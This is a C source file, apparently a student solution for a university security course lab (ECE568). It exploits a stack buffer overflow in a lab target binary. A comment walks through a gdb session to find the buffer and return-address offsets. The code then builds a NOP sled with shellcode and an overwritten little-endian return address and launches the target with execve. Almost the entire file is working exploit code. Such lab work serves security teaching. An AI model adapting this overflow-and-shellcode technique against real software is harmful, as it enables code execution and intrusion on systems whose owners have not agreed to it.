#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

#include "shellcode-64.h"

#define TARGET "../targets/target1"

/*
The following are from a gdb debug session:

```shell
(gdb) info frame
Stack level 0, frame at 0x3021fed0:
rip = 0x400bac in lab_main (target1.c:15); saved rip = 0x4009b8
called by frame at 0x3021ff00
source language c.
Arglist at 0x3021fec0, args: argc=2, argv=0x7fffffffd418

Locals at 0x3021fec0, Previous frame's sp is 0x3021fed0
Saved registers:
rbp at 0x3021fec0, rip at 0x3021fec8

(gdb) x 0x3021fec8
0x3021fec8:     0x004009b8

(gdb) x 0x004009b8
0x4009b8 <lab_main_thread+98>:  0x8b48c289

(gdb) p &buf
$2 = (char (*)[96]) 0x3021fe50
```

- `buf` is located at address 0x3021fe50 - 0x3021feb0 (0x3021fe50 + 0x60)
- Function `lab_main` returns to `lab_main_thread` at address 0x004009b8. We want to change this address to the address of the `buf` at address at 0x3021fec8, which contains shellcode and `NOP`s.
- Address of the `buf` is 0x3021fe50; Address of RA is 0x3021fec8. Thus, we need `attack_s` of size 0x3021fec8 - 0x3021fe50 + 0x4 = 0x78 + 0x4 == 124 bytes. First 120 bytes are `NOP`s followed by shellcode and the last 4 bytes are the address of `buf` in little endian format.
*/

/* ECE568 BEGIN */
#define NOP '\x90'
#define SHELLCODE_LEN sizeof(shellcode) / sizeof(shellcode[0])
#define BUF_SIZE 0x3021fec8 - 0x3021fe50
#define RA_LEN 4
#define BUF_TO_OVERFLOW_SIZE BUF_SIZE + RA_LEN
/* ECE568 END */

int main(int argc, char* argv[]) {
    char* args[3];
    char* env[1];

    /* ECE568 BEGIN */
    char attack_s[BUF_TO_OVERFLOW_SIZE];
    memset(attack_s, 0, BUF_TO_OVERFLOW_SIZE);

    for (int i = 0; i < BUF_SIZE - SHELLCODE_LEN + 1; i++) {
        attack_s[i] = NOP;
    }

    strcat(attack_s, shellcode);
    strcat(attack_s, "\x50\xfe\x21\x30");  // little endian, store in reverse order
    /* ECE568 END */

    args[0] = TARGET;
    args[1] = attack_s;
    args[2] = NULL;

    env[0] = NULL;

    if (execve(TARGET, args, env) < 0)
        fprintf(stderr, "execve failed.\n");

    return (0);
}